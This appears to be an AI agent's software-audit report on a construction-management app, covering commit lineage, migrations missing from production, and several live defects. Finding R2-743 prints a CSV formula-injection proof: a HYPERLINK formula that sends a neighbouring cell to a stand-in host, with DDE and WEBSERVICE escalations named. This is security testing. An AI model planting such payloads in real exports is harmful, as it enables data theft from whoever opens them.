`:163`. Printing lines 152-166 settles it in one command.

That is the same mistake I *avoided* on R2-247, where `raised_by`/`assigned_to` at `:135-136`
turned out to belong to `NCRResponse` rather than `NCRCreate` — there I checked the class boundary
before writing anything. Here I did not.

**Consequences, all corrected:**

- **R2-114's claim is accurate.** It states that "company + branch GSTIN write paths enforce the
  canonical 15-char pattern + mod-36 Luhn check digit", and both do.
- **R2-290's claim is accurate**, and its verdict text has been corrected — it previously repeated
  my wrong reading.
- There is no second GSTIN standard. The finding does not exist.

**Standing rule this produces:** when a grep shows a validator binding, resolve which class owns
that line before drawing any conclusion from its absence elsewhere. Line numbers from a flat grep
carry no scope.

### R2-725 · HIGH · 93 closed rows cite a regression suite that does not exist in the live lineage

**Found while re-prioritising the remaining CRITICALs.** Their register notes are terse and, instead
of describing the fix, cite an identifier: *"wave W01a; suite RC-014"*.

**The suite is not in the live lineage.** `docs/AUDIT_REGRESSION_SUITE.md` exists **only on my own
orphaned branch** (`27fab37` / `98b3a3f`), which is explicitly never to be merged. `git ls-tree` on
`campaign/waves` returns nothing for it.

| measure | value |
|---|---|
| register rows citing an RC id | **93** |
| status of those rows | **all 93 are `FIX_VERIFIED`** |
| severity | 50 CRITICAL · 29 HIGH · 14 MEDIUM |
| distinct RC ids cited | 83 |
| RC ids actually defined (orphan branch only) | 32 |
| **cited but never defined anywhere** | **56** |

**What this is not.** These rows are `FIX_VERIFIED`, which in this register means *founder
live-confirmed* — the strongest status it has, and independent of any suite. So this is **not** a
claim that 93 findings are unfixed. Several of them I have already confirmed by other means.

**What it is.** For 93 closed rows — including 50 CRITICALs — the register's stated evidence points
at a file that is not in the repository, and two-thirds of the identifiers it points at were never
defined even where the file does exist. Anyone asking "what proves this one?" gets a dangling
reference.

**Not the fix campaign's doing.** These citations predate the opencode agent; it inherited the
register with them already in place. The mechanism is ordinary and worth naming plainly: evidence
was recorded as a pointer into an artifact on a branch that was later abandoned, and the pointer
outlived the artifact.

**Consequence for this pass.** For these rows the register note cannot supply E1 — there is nothing
to read. Verification has to come from the fix commit's diff and the live product instead, which is
how I am working them.

#### Addendum — restoring the doc does not make the suite runnable

The fix campaign restored `AUDIT_REGRESSION_SUITE.md` into the live lineage immediately, which was
the right call and makes the 32 defined ids **readable**. It does not make them **runnable**, and
the distinction matters.

Each RC entry is a shell command invoking a specific pytest file. Every one of those files is
absent from `campaign/waves`:

- `test_r2_042_payment_settles_bill.py`
- `test_r2_565_predecessor_cpm.py`
- `test_r2_588_timesheet_headers.py`
- `test_r2_599_dpr_task_scope.py`

They lived on the same orphaned branch as the doc. So the restored suite documents *intent* — what
each check was meant to prove, and its pre-fix failure signature — while its commands cannot
execute.

**The underlying fixes are fine, and that is the important half.** I checked all four on
`campaign/waves` and each is present in the agent's own idiom: `planning.py` now does
`latest_finish(s) - timedelta(days=...)` rather than subtracting a float from a datetime; the
settlement fields exist in `finance.py`; the timesheet endpoints exist; DPR is project-scoped. The
agent re-fixed these independently, which is exactly what the orphan-branch recon concluded it had
done.

So the accurate statement is narrow: **the code is fixed, the documented checks are readable, and
the automated commands are inert.** Restoring the doc converted an unreadable pointer into a
readable one — real progress, and worth saying so — but anyone treating those RC citations as
runnable evidence is still mistaken.

**Fix direction.** Two options, both cheap. Either lift `AUDIT_REGRESSION_SUITE.md` off the orphaned
branch into the live lineage as a historical record — it is a documentation file, so this carries
none of the merge risk that makes the rest of that branch unmergeable — or replace the 93 citations
with the evidence that actually justified them. The first is one `git show > file`; it makes 32 of
the 83 ids resolvable and leaves the other 56 honestly marked as undefined.

## Class I — the register's evidence points at a branch that was abandoned

### R2-726 · CRITICAL · the Enterprise Rollup net-balance sign error is still live (R2-025 is `FIX_VERIFIED`)

**The most consequential single defect this pass has found**, and it was found by asking a question
I had not thought to ask: *is the commit this row cites even in the live lineage?*

R2-025 is CRITICAL and `FIX_VERIFIED`. Its cited commit `f32ca77` is **not an ancestor of
`campaign/waves`** — it is on my own orphaned branch. And unlike the four cases I checked under
R2-725, here the fix was **not** independently reproduced. The defect is live.

**Two sites in `finance.py`, both inside `get_enterprise_rollup` (`:836`):**

```
:872   balance       = p["advance_paid"] + p["advance_received"] - p["to_pay"] - p["to_receive"]
:891   total_balance = totals["advance_paid"] + totals["advance_received"]
                     - totals["to_pay"] - totals["to_receive"]
```

`advance_paid` and `to_receive` are assets; `advance_received` and `to_pay` are liabilities. The
correct net is `(advance_paid + to_receive) - (to_pay + advance_received)`. Both lines **add a
liability and subtract an asset** — two of the four terms carry the wrong sign.

**The same file already contains the correct formula.** At `:724`, the party-level balance reads:

```
balance = round(advance_paid + to_receive - advance_received - to_pay, 2)
```

That is R2-096's site, which the campaign fixed and which I confirmed earlier in this pass. So
`finance.py` holds the right formula and the wrong one about 150 lines apart, and the wrong one is
the company- and enterprise-level figure.

**Worked example.** A company that has sold 100,000 and purchased 30,000 is net owed **+70,000**.
The live formula returns `0 + 0 - 30,000 - 100,000 = -130,000` — wrong sign, and wrong magnitude by
200,000. An owner reading the Enterprise Rollup sees a large net liability where the business is in
fact a net creditor.

**Why the status says otherwise.** `FIX_VERIFIED` means founder live-confirmed, and it very likely
*was* correct when confirmed — on the branch that carried `f32ca77`. That branch was never merged.
The status is a true statement about a tree that is not the one being deployed.

**Fix direction.** Two lines. Reuse the `:724` expression verbatim at both sites, or better, extract
it into one helper so the three call sites cannot drift again.

### R2-727 · CRITICAL · 94 closed rows cite commits that are not in the live lineage

**R2-726 is one instance. This is the class, and it needs a row-by-row sweep.**

Of the 315 closed rows, **94 cite a commit sha that is not an ancestor of `campaign/waves`** — they
resolve only on the orphaned branch `27fab37` / `98b3a3f`.

| cut | value |
|---|---|
| closed rows citing a sha reachable from `campaign/waves` | 218 |
| **closed rows whose only cited sha is orphan-only** | **94** |
| severity of those 94 | **48 CRITICAL** · 29 HIGH · 17 MEDIUM |
| status of those 94 | 90 `FIX_VERIFIED` · 4 `FIXED` |
| rows citing no sha at all | 3 |

This is the same root cause as R2-725 — the register inherited evidence pointing into a branch that
was later abandoned — but with a far sharper consequence. R2-725 costs traceability. This costs
correctness wherever the fix was **not** independently reproduced.

**It is not "94 live defects", and I want to be exact about that.** The orphan-branch recon
established that the campaign re-fixed the same findings in its own idiom, and that holds for every
one I have sampled bar R2-025:

- R2-565 — `planning.py` does `latest_finish(s) - timedelta(days=…)`; the float-minus-datetime crash is gone
- R2-042 — settlement fields present in `finance.py`
- R2-588 — timesheet endpoints present
- R2-599 — DPR is project-scoped
- **R2-025 — NOT reproduced. Live defect. See R2-726.**

So the finding is: **94 rows are closed on evidence that cannot be inspected, and at least one of
them is materially wrong in production.** One in a sample of five is too high a miss rate to leave
the other 89 unexamined.

**A trap worth recording, because it nearly caught me.** My worklist resolved each row's sha with
`git rev-parse`, which succeeds for *any* commit in the repository — including orphan-branch
commits. I was about to read my own abandoned diffs and record the campaign's rows as CONFIRMED on
the strength of them. Ancestry has to be checked explicitly:
`git merge-base --is-ancestor <sha> campaign/waves`. `scripts/verification/lineage_audit.py` does
this in one pass.

**Fix direction.** Sweep the 94 by comparing the *intent* of each finding against the live tree,
never against the orphaned diff — the campaign's re-fix will not share my idiom, so grepping for my
implementation's shape produces false negatives. Row list in
`scratchpad/orphan_rows.txt`; the 48 CRITICALs come first, and this is now the top of my queue.

### R2-728 · CRITICAL · attendance punch-out raises a TypeError on Postgres; the suite cannot see it

**Second confirmed instance of the R2-727 class**, and this one is the phase thesis in its purest
form: a defect that **passes on SQLite and 500s on Postgres**.

R2-210 is CRITICAL and `FIX_VERIFIED`. Its cited commit `e2e449d` is orphan-only. The fix it
describes — replacing naive `datetime.utcnow()` with the aware helpers in `app/timeutil.py` — was
**not reproduced**. `app/timeutil.py` does not exist on `campaign/waves`.

**The mechanism, in three lines of live code** (`hr.py`, punch-out branch):

```
:332   now   = datetime.utcnow()                       # NAIVE
:342   if log.punch_in:
:343       delta = (now - log.punch_in).total_seconds() / 3600
```

and the column (`models.py:721`):

```
punch_in = Column(DateTime(timezone=True), nullable=True)
```

`log` is freshly queried at `:323`, so `punch_in` comes back from the driver:

- **Postgres** returns `timestamptz` as an **aware** datetime → `naive - aware` raises
  `TypeError: can't subtract offset-naive and offset-aware datetimes` → **500 on every punch-out**
- **SQLite** returns it **naive** → the subtraction succeeds → **the test suite passes**

There is no `tzinfo` normalisation anywhere in the punch-out path; I checked the whole branch.

**The damning contrast is in the same file.** `hr.py:400-405` normalises all three datetimes before
comparing them:

```
if entry_date.tzinfo is None:
    entry_date = entry_date.replace(tzinfo=timezone.utc)
```

That is R2-563, which the campaign **did** fix and which I confirmed earlier in this pass. So
`hr.py` contains both the guarded pattern and the unguarded one, for the same hazard, a few dozen
lines apart.

**Secondary, same root cause.** `:290` builds `today_start` with naive `utcnow()` and compares it
against the `attendance_date` timestamptz column in SQL. That will not raise, but it is compared
across a timezone boundary, so the "today" window can be off by the server offset.

**Status of the evidence.** This is a high-confidence code-level finding with the mechanism
established from the column type and the driver contract; I have **not** executed a punch-out
against production. That would need a real employee row and would write live attendance data, so I
am flagging it rather than proving it by writing. If you want the live proof, say so and I will do
it in the test company.

**Impact if confirmed.** Punch-out is a daily-use path for every site worker. A 500 there means the
punch-in row is never closed, so hours worked and overtime are never computed — which flows into
payroll.

**Fix direction.** Either port `timeutil.py` from the orphaned branch (it exists, it is small, and
it is documentation-free code with no merge risk beyond the file itself) or apply the `:400-405`
pattern inline at `:332` and `:290`. The second is smaller and matches what the campaign already
does elsewhere in this file.

### R2-729 · CRITICAL · the Delete Logs page fetches in an unbounded loop — proved live at ~3.4 req/s

**Third confirmed miss from the R2-727 orphan-lineage class, and the first one proved against
production rather than argued from code.**

R2-310 is CRITICAL and `FIX_VERIFIED`. Its cited commit `af04f74` is orphan-only, and the fix —
wrapping `authHeaders` in `useMemo` so the callback identity stabilises — was **not reproduced**.
`origin/main` and `campaign/waves` carry byte-identical copies of the unfixed file.

**The mechanism** (`d/delete-logs/page.tsx`):

```
:64   const authHeaders = accessToken ? { Authorization: `Bearer ${accessToken}` } : undefined;
:66   const fetchLogs = useCallback(async () => { … }, [ …, authHeaders ]);
:92   useEffect(() => { fetchLogs(); }, [fetchLogs]);
```

`authHeaders` is a fresh object literal on every render, so the `useCallback` dependency changes on
every render, so `fetchLogs` is a new function on every render, so the effect refires. `fetchLogs`
then calls `setLoading` and `setLogs`, which re-render, which mints a new `authHeaders`. The cycle
has no fixed point.

**Live evidence, production, test company.** Instrumented `window.fetch`, navigated to the page,
counted requests to `/apis/v3/delete-logs/…`:

| elapsed | requests |
|---|---|
| 3 s | 8 |
| 10 s | **32** |

That is **~3.4 requests per second, sustained**, still climbing when I navigated away. Every one is
a database query against the production pool, and it continues for as long as the tab is open.

**A measurement error of mine, recorded because it nearly cleared a live CRITICAL.** My first run
reported 2 requests in 4 seconds and I briefly concluded there was no loop. That window began at the
moment of the client-side navigation, so it mostly covered the route transition before the component
mounted. Re-running with a 3s/10s split showed the real rate. **When measuring a rate on a
client-side route change, start the clock after mount, not at the click.**

**Impact.** This is the defect the audit originally measured at ~16 req/s and described as
exhausting the DB pool and taking the whole console down. It is live now. Anyone leaving the Delete
Logs tab open generates a sustained query stream for the entire company.

**Fix direction.** One line — `const authHeaders = useMemo(() => accessToken ? {…} : undefined,
[accessToken])`. Worth a lint rule too: an object or array literal in a `useCallback`/`useEffect`
dependency array is always this bug.

### R2-730 · HIGH · `material_wastage.reported_by` is still free text in production; its migration never ran

**From R2-206** (`83c32c2`, `FIXED`), which states the column was *"converted to UUID FK, migration
20260816_000005 nulls legacy free text"*.

**Live Supabase says otherwise:**

| check | result |
|---|---|
| `material_wastage.reported_by` type | **`character varying`** (model declares `UUID` FK to `company_team.id`) |
| foreign key on that column | **none** |
| rows in `material_wastage` | 3 |
| **rows whose `reported_by` is not a UUID** | **2** |

The migration file exists in the repo and did not run. This is the failure mode the boot sync
cannot cover: `ensure_postgres_schema_sync` adds *missing columns*, but it will never change an
existing column's **type**, so a column that is already there in the wrong type stays wrong
forever, silently.

**Concrete consequence.** The ORM maps `reported_by` as `UUID`. Two production rows hold free text.
When SQLAlchemy loads them it will attempt to coerce that text into a UUID and raise
`ValueError: badly formed hexadecimal UUID string` — a 500 on the wastage read path, for rows that
already exist.

**Why this one matters beyond its own severity.** It is the first *confirmed* case of a migration
file that exists in the repository and was never applied to production. R2-701 showed migrations
that were never written; this shows one that was written and never ran. **The other eight
migrations dated 2026-08-15 and later should be checked the same way** — I verified five of them
landed (`face_recognition_logs.created_at`, `drawing_pins.resolved`,
`material_indents.approved_by`, `bills.cancelled_at`, `revoked_tokens` + `users.tokens_revoked_at`),
so the failure is specific rather than systemic, but "specific" was only established by looking.

**Fix direction.** Re-run `20260816_000005`, but it needs a data decision first: two rows hold
names, not ids. Either map them to the matching `company_team` row or null them, per the migration's
stated intent. Not a mechanical re-run.

## Verified clean so far

Recorded so the pass is not only a list of complaints. Each claim was re-checked against the tree,
not taken from the note.

| id | sev | claim | result |
|---|---|---|---|
| R2-017 | CRITICAL | fabricated demo data gone from 4 named files | **holds** — zero matches in all four |
| R2-110 | CRITICAL | holiday seed gone, `fetchHolidays` GETs, delete calls the API | **holds** — `hr/page.tsx:276,278,305,307` |
| R2-061 | MEDIUM | `setFleet` only ever called with API data or `[]` | **holds** — only `:108` and `:133` |
| R2-085 | LOW | no internal phase labels remain | **holds** — only ZATCA "Phase 1", legitimate domain term |

The four closures are accurate about what they claim. R2-712 exists anyway, because three of them
were scoped to the files a finding named rather than to the defect class.

---

## R2-731 · CRITICAL · Nothing applies `supabase/migrations/*.sql` — the whole directory is hope, not process

**Generalises R2-730 from one file to the entire migration mechanism.**

**What is true.**

- There is no Alembic and no other ORM migration tool. `README.md:292` and `backend/README.md:53`
  both say so explicitly: local dev builds the schema from `Base.metadata.create_all`, and
  production is expected to have the SQL applied "via the Supabase SQL editor or your migration
  workflow".
- `git grep supabase/migrations` over `campaign/waves`, excluding `docs/` and `audit/`, returns
  only READMEs, two comments in `models.py`, two test files and the migration files themselves.
  **No application, script, container entrypoint or job ever reads that directory.**
- `.github/workflows/` contains exactly one file, `keep_alive.yml`. There is no CI step that
  applies migrations.
- `backend/app/routers/admin_migrations.py` is *not* a runner. It is a set of hand-written data
  backfills (`_backfill_company_files`, `_backfill_project_files`, RBAC backfill) behind
  `X-Admin-Secret`. It never opens a `.sql` file.
- The D-V4 gate, `backend/tests/coverage/test_dv4_constraint_migration_gate.py:106`, asserts that
  every named `UniqueConstraint`/`Index` in `Base.metadata` **"must appear in
  supabase/migrations/"** — that is, that a *file exists containing the name*. A file existing is
  precisely the condition that was already true for `20260816_000005` when R2-730 was found.

**Why this is CRITICAL rather than process hygiene.** Twenty migrations are dated 2026-08-15 or
later, and the campaign's own decision batch adds more (`7e8b54d` for D-V2/R2-613, the eight
constraints with purge). Every one of them is closed in the register on the strength of the file
being committed. The single case anybody actually checked against production — R2-730 — had not
run. There is currently **no evidence, and no mechanism that could produce evidence**, that any of
the other nineteen ran.

**Blast radius.** Every closure whose fix is "add a migration" is unverified by construction. That
includes D-V2's seven unique constraints (R2-701/R2-702), `revoked_tokens` (token revocation — a
security control), the 2026-08-24 RLS tenant-predicate migration, and the payment-request FK
repoint.

**The gate that would actually close this** is not a source-text assertion. It is a probe run
against the production database that enumerates the objects each migration creates and reports
which are absent — the same shape as the query in
`scratchpad/probe.sql`, which is written and waiting on a Supabase session.

**Status.** E1 complete (code read, above). **E0 blocked** — needs the Supabase SQL editor, which
is logged out. The probe covers 32 objects from the 20 late migrations plus two sanity rows.

---

## R2-732 · LOW · Two migrations share the sequence prefix `20260825_000004`

`20260825_000004_missing_unique_constraints.sql` and `20260825_000004_po_cancelled_columns.sql`
carry the same date and sequence number. With no runner (R2-731) nothing breaks today, because
ordering is whatever a human types. The moment a runner is introduced and keys on the prefix — the
normal fix for R2-731 — one of the two is silently skipped or the pair sorts non-deterministically.
Renumber before building the runner, not after.


---

## R2-733 · MEDIUM · Every successful login still lands on the report catalogue

**Residual of R2-047, which is closed FIXED.** R2-047 named two things: nine unreachable
company routes, and — under "Also:" — that `app/login/page.tsx:133, 139` sends users to
`/c/{companyId}/reports`, "the *report catalogue*, not any dashboard". The reachability half was
fixed properly (see the R2-047 verdict). The redirect was not touched:

- `login/page.tsx:131-133` — `window.location.href = shouldOnboard ? "/profile/onboarding" : ``/c/${companyId}/reports```
- `login/page.tsx:138` — `pickCompany` does the same for the multi-company chooser.

Now that `/d/home` (Project Hub) is a primary-nav entry (`Sidebar.tsx:102`), there is a dashboard
to land on and no reason to open on a list of report types. Nothing in the register or in
`VERIFICATION_DECISIONS_RESOLVED.md` tracks this — an instance of the R2-717 class, found while
verifying the row that disclosed it.

**Fix.** Point both redirects at the page the founder considers the company dashboard.

---

## R2-734 · MEDIUM · `/d/planning` is the one route R2-046's overflow menu does not carry

**Residual of R2-046, which is closed FIXED.** The fix adds `MORE_TABS` at
`c/[company_id]/p/[project_id]/layout.tsx:28`, rendered at `:231`. It is a good fix — each entry
mirrors the module's legacy redirect stub and appends `?project=` where the company page is
project-aware. It carries **27 entries**; R2-046 named **28** unreachable routes.

The missing one is bare **`planning`**. `MORE_TABS` has "Planning Gantt" → `/d/planning/gantt` but
no entry for `/d/planning`, and `Sidebar.tsx` has no planning entry either — its only
`permission: "planning:view"` item is "Team Schedule", pointing at `/d/team-action`
(`Sidebar.tsx:134-136`).

`frontend/src/app/c/[company_id]/d/planning/page.tsx` exists and renders. Its sole inbound link in
all of `frontend/src` is a Help-page hyperlink at `d/help/helpContent.tsx:194` — and R2-046's own
criterion excluded Help links. So one module out of the 28 is still navigable only by typing the
URL.

**Fix.** One line in `MORE_TABS`, or a deliberate decision that `/d/planning` is superseded by the
Gantt view and should be deleted.


---

## R2-731 · E0 RESULT — measured against production, 2026-08-27

The probe in `scripts/verification/probe_migrations_ran.sql` was run against the live database
(Supabase project `ujdxgiqafaobhrskzkmr`, `siteflow`, branch `main`). **Both sanity rows behaved:**
`companies.id` returned 1, `companies.no_such_col` returned 0.

**Eight migrations dated 2026-08-16 to 2026-08-25 have never taken effect. Eighteen objects are
absent.**

| migration | absent in production |
|---|---|
| `20260816_000004` tally voucher template | `tally_connections.voucher_number_template` default is `<NONE>` |
| `20260821_000003` | `uq_three_way_matches_po_grn` |
| `20260821_000005` BOQ cost-code width | `boq_items.cost_code` is still **`varchar(50)`**, not 100 |
| `20260823_000001` | `uq_payroll_runs_company_project_month` |
| `20260824_000001` **RLS tenant predicates** | **0 `_tenant_scoped` policies, 0 tables with FORCE RLS** |
| `20260825_000002` | `fk_payment_requests_party_company_user_id` |
| `20260825_000003` duplicate purge + constraints | all **seven**: `uq_bills_…invoice_number`, `uq_goods_receipt_notes_…grn_number`, `uq_material_indents_…indent_number`, `uq_ncrs_project_id_ncr_number`, `uq_payments_…reference_number`, `uq_purchase_orders_…po_number`, `uq_work_orders_…wo_number` |
| `20260825_000004` | `uq_company_team_company_id_user_id`, `uq_library_cost_codes_company_id_code` |
| `20260825_000004` (the second file with that prefix — R2-732) | `purchase_orders.cancelled_at`, `purchase_orders.cancelled_by` |

**The negatives were verified before being believed** (trap 1). Three ways they could have been
false, all checked:

1. *"The constraints exist as unique indexes, not constraints, so `pg_constraint` missed them."*
   `select indexname from pg_indexes where schemaname='public' and indexname like 'uq%'` returns
   **`<NONE>`**. There is not a single `uq_`-named index in the database.
2. *"The RLS policies exist under different names."* `pg_policies` for `public` holds **139
   policies and 140 tables have `rowsecurity` enabled** — so RLS is on, but every policy sampled is
   of the legacy permissive shape: `drawing_pins_authenticated_all`,
   `purchase_orders_authenticated_all`, `companies_authenticated_all`, … The 2026-08-24 migration
   would have added `*_tenant_scoped` predicates **and** `FORCE ROW LEVEL SECURITY`. Neither is
   there. Tenant isolation in production is still "any authenticated user", the state the migration
   was written to end.
3. *"The width change did apply and I mis-typed the column."* `character_maximum_length` for
   `boq_items.cost_code` reads **50**, the pre-migration value.

**What did run.** `20260815_000001`, `20260816_000001/2/3/6`, `20260821_000001/000002/000004` are
all present. **Including `20260816_000005` — `material_wastage_reported_by_fkey` now exists, so
R2-730's migration has been applied since it was filed.** R2-730 can be closed against production.
That one file getting applied is the exception that shows the mechanism is manual: somebody ran the
migration a finding named, and not the eight nobody had named yet.

### The duplicate window D-V2 was racing has begun to close

D-V2 was decided "migrate now, this week" on the explicit premise that **the duplicate count is
zero today**. Measured now:

| pair | duplicate groups |
|---|---|
| `bills(company_id, invoice_number)` | 0 |
| `purchase_orders(company_id, po_number)` | 0 |
| **`company_team(company_id, user_id)`** | **1** |
| **`three_way_matches(po_id, grn_id)`** | **2** |

`20260825_000003` and `20260825_000004` are `DO` blocks that `RAISE NOTICE` and `RETURN` when
duplicates are present. So even when somebody does run them, **`uq_company_team_company_id_user_id`
and `uq_three_way_matches_po_grn` will silently skip** and the run will look successful. The purge
step in `7e8b54d` is what handles this, and it is exactly the part that has not executed.

**Severity holds at CRITICAL and the RLS row is the reason.** A tenant-isolation control that
exists only as a file in a repository is not a control.

---

## R2-735 · HIGH · D-V1 step 3 was never executed — the demo tenant is still in production

Measured in the same session. `companies` holds **five** rows:

```
e0000000-0000-0000-0000-000000000000 = Demo Construction Ltd
fcf53673-3bec-49b9-9b85-c03226127fb9 = pranjal ltd
1776c887-5552-4611-aad5-f4899aad0f87 = Test Claude B2 Construction
1fa705a4-7aa6-42f2-9906-65902c96916f = ZZ R8 Throwaway
d3724ec3-edac-4b5f-b296-fc6a013b7b5d = AK Construction
```

- demo company row present = **1**
- demo user `e0000000-…-100` present = **1**
- projects under the demo company = **5**

D-V1 had three steps: delete the code path, replace the 11 fallbacks, **then delete the rows and
their 5 projects**. Steps 1 and 2 are done and verified (see the R2-024 verdict). Step 3 has not
happened. The rows are now unreachable from application code, which is a real improvement — but the
decision as written is not complete, and `audit/` records D-V1 as closed.

**Fix.** Cascade-check, then delete the 5 projects, the demo user and the demo company.


## Summary

| id | sev | class | from |
|---|---|---|---|
| R2-701 | CRITICAL | not in effect in prod | R2-559 |
| R2-702 | HIGH | not in effect in prod | R2-191 |
| R2-703 | HIGH | prod defect | — |
| R2-704 | MEDIUM | latent prod defect | — |
| R2-705 | MEDIUM | fake gate | R2-077 |
| R2-706 | MEDIUM | fake gate | R2-578 |
| R2-707 | MEDIUM | fake gate | R2-351 |
| R2-708 | MEDIUM | fake gate | R2-341 |
| R2-709 | LOW | fake gate | R2-040 |
| R2-710 | HIGH | evidence class | the pin suite |
| R2-711 | MEDIUM | evidence class | — |
| **R2-712** | **CRITICAL** | **class finding, 11 instances, proved live in browser + SQL** | R2-017 class sweep |
| ~~R2-713~~ | — | merged into R2-712 as instance 11 | — |
| ~~R2-714~~ | — | merged into R2-712 as instance 3, the money path | — |
| ~~R2-715~~ | — | merged into R2-712 as instance 6 | — |
| ~~R2-716~~ | — | merged into R2-712 as instances 7-8 | — |
| **R2-717** | **HIGH** | **class finding — 29 closed rows disclose untracked residue** | register-wide sweep |
| **R2-718** | **HIGH** | **class finding — 169 closures have no gate; 61 of them CRITICAL** | register-wide sweep |
| **R2-719** | **CRITICAL** | **class finding — 90 invented-default sites; 8 sentinel UUIDs resolve to real production rows** | generalised from R2-083 |
| **R2-720** | **HIGH** | **Internal Transfer is inert — Save fires no request, no error** | discharging D-V3 |
| **R2-721** | **MEDIUM** | **statutory `report_type` unvalidated — silent no-due-date, zero cess** | found verifying R2-129 |
| **R2-722** | **HIGH** | **second demo-tenant creation path in auth.py; demo OTP allowlist/code default in source** | found verifying R2-183 |
| **R2-723** | **HIGH** | **cancelled bills still counted in budget/BI/tower actuals — 8 sites R2-232 missed** | found verifying R2-045/066 |
| ~~R2-724~~ | — | **RETRACTED** — branch GSTIN does run the checksum; I misread the class boundary | — |
| **R2-725** | **HIGH** | **93 FIX_VERIFIED rows cite an RC suite absent from the live lineage; 56 ids never defined** | found re-prioritising the CRITICALs |
| **R2-726** | **CRITICAL** | **Enterprise Rollup net balance has a live sign error; R2-025 is FIX_VERIFIED but its commit is orphan-only** | found auditing commit lineage |
| **R2-727** | **CRITICAL** | **94 closed rows (48 CRITICAL) cite commits not in the live lineage; at least one fix was never reproduced** | lineage audit |
| **R2-728** | **CRITICAL** | **attendance punch-out raises TypeError on Postgres; passes on SQLite so the suite cannot see it** | orphan-lineage sweep |
| **R2-729** | **CRITICAL** | **Delete Logs fetches in an unbounded loop — proved live at ~3.4 req/s against the production pool** | orphan-lineage sweep |
| **R2-730** | **HIGH** | **material_wastage.reported_by still free text; migration 20260816_000005 exists but never ran** | live schema sweep |
| **R2-731** | **CRITICAL** | **nothing applies `supabase/migrations/*.sql` — no runner, no CI, no entrypoint; the D-V4 gate asserts only that a file exists** | generalised from R2-730 |
| **R2-732** | **LOW** | **two migrations share the prefix `20260825_000004`** | migration sweep |
| **R2-733** | **MEDIUM** | **login still lands on the report catalogue — R2-047's own "Also:" sub-claim, untracked** | verifying R2-047 |
| **R2-734** | **MEDIUM** | **`/d/planning` missing from the R2-046 overflow menu — 27 of 28 routes covered** | verifying R2-046 |
| **R2-735** | **HIGH** | **D-V1 step 3 never executed — Demo Construction Ltd, its user and 5 projects are still live rows** | E0 probe |

**Thirty live findings** (R2-724 retracted). R2-713..R2-716 were filed separately first and are struck through, not
deleted, so the history stays traceable.

Three to act on first, for different reasons:

- **R2-712 instance 3** — a money-movement form writing account names that exist for nobody.
- **R2-701** — a live defect with a closing window: the migration applies cleanly only while the
  duplicate count is still zero.
- **R2-711** — the reason R2-701 could be closed as fixed without anyone noticing. Cheap, and it
  closes the whole class rather than the seven instances.

---

# Round 3 findings (R2-743 onward)

Round 3 is the pass over the 370 closed register rows that were never opened individually.
Protocol unchanged: E0 schema / E1 code read / E2 gate / E3 live, E1 never skipped, and every
finding read **as filed** rather than from its register note.

| id | severity | one-line | surfaced while |
|---|---|---|---|
| **R2-743** | **CRITICAL** | **the BI CSV feed is formula-injectable — the fourth call site R2-185 named, never fixed, and R2-407 was closed claiming it was the last one** | worklist row 4 (R2-407) |
| **R2-744** | **CRITICAL** | **Tally export books every supply as CGST+SGST — the one D4 place-of-supply surface never swept; reports and the invoice PDF now emit IGST and disagree with it** | worklist row 5 (R2-410) |
| **R2-745** | **CRITICAL** | **quotation→invoice conversion bypasses `_validate_bill_line_items`; inter-state quotations produce a tax invoice with gst_amount 0** | worklist row 2 (R2-271) |
| **R2-746** | **CRITICAL** | **company switch never re-mints the session — team invites land in the previous company; proved live in the founder's own session** | verifying R2-418 E3 |
| **R2-747** | **HIGH** | **invoice HSN/SAC column renders empty — quotation conversion drops the field and no validator requires it** | worklist row 3 (R2-399) |
| **R2-748** | **MEDIUM** | **invoice PDF and the shared party-name resolver use opposite precedence — one party, two printed names (latent: 0 live instances)** | worklist row 21 (R2-131) |

## FINDING R2-743 — 🔴 CRITICAL: the BI export feed writes user-controlled text straight into CSV cells, so the one export built for external consumption is the one still formula-injectable

**This is R2-185's fourth call site.** R2-185 as filed reads *"Fix: prefix any value starting with
`= + - @ \t \r` with a single quote, or quote-and-escape via a shared writer helper. **One helper,
four call sites.**"* and enumerates them:

| Export named by R2-185 | Fixed? | Commit |
|---|---|---|
| `labour.py` BOCW | ✅ | `b3d3a77` |
| `dpr.py` Daily Progress | ✅ | `beb5823` (as R2-266) |
| `hr.py` payroll/attendance | ✅ | `74b64ce` (as R2-407) |
| **`bi_export.py:85` BI feed — "every column, via `csv.DictWriter`"** | ❌ **never** | — |

R2-185 was closed on the BOCW site alone. R2-407 was then closed with the note *"payslip CSV
neutralizes formula cells (**last raw-text exporter**)"* — that parenthetical is false, and it is
what stopped anyone looking further.

### The code
`_to_csv` (`backend/app/routers/bi_export.py:86-92`) is the only CSV path in the file and applies no
neutralization whatsoever:

```python
def _to_csv(rows: List[dict], columns: List[str]) -> str:
    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=columns, extrasaction="ignore")
    writer.writeheader()
    for r in rows:
        writer.writerow(r)
    return buf.getvalue()
```

A whole-file grep for `lstrip` / `startswith` / `escape` / `sanit` / quote-prefixing returns nothing
relevant. All three feed routes render through it: `feed_projects` (:236), `feed_budget_variance`
(:327), `feed_labour_productivity` (:365). The other three exporters each carry a local
`_csv_safe_cell`; `bi_export.py` has zero references to one.

### Proved live, 2026-08-28, in ZZ R8 Throwaway
A project was created whose `name`, `code` and `city` are spreadsheet formulas, and the feed was
pulled with a real BI API key. The response body, verbatim:

```
project_id,name,code,status,city,state,category,stage,health,project_value,planned_start_date,planned_end_date
fb4ec3cd-1172-4b4f-a11d-ae4f51ea7412,"=HYPERLINK(""https://zz.example/?d=""&A1,""ZZ CLICK"")",@ZZ-CODE,Ongoing,+ZZCITY,Maharashtra,,,Good,0.0,,
```

Three injectable cells in a single row:
- `name` — quote-doubled by `csv.DictWriter`, but the leading `=` survives intact. This is the exact
  signature R2-407 reproduced and called fixed.
- `code` — `@ZZ-CODE`, bare and unquoted.
- `city` — `+ZZCITY`, bare and unquoted.

`&A1` concatenates the neighbouring cell into the request URL, which is the standard exfiltration
primitive; swapping `HYPERLINK` for `WEBSERVICE` / `IMPORTXML`, or a `cmd|` DDE string, escalates it
to silent data theft or command execution on the opener's machine.

**Cleanup:** the test project was deleted (`{"success":true,"deleted_dependents":0}`) and both BI
keys revoked — confirmed `revoked: true` on both, and the raw key now returns 401 against the feed.

### Why CRITICAL rather than HIGH, unlike its parent
R2-185 was filed HIGH across four in-app exports. This site is worse than its siblings on three
counts, which is why it is filed at the parent's escalated severity rather than its original:

1. **It is the export designed to be opened by a machine that is not SiteFlow.** The BI feed exists
   solely to be pulled into Excel, Power BI, Sheets or a warehouse. Every other exporter produces a
   file a human might glance at first; this one is wired straight into the tool that evaluates the
   formula.
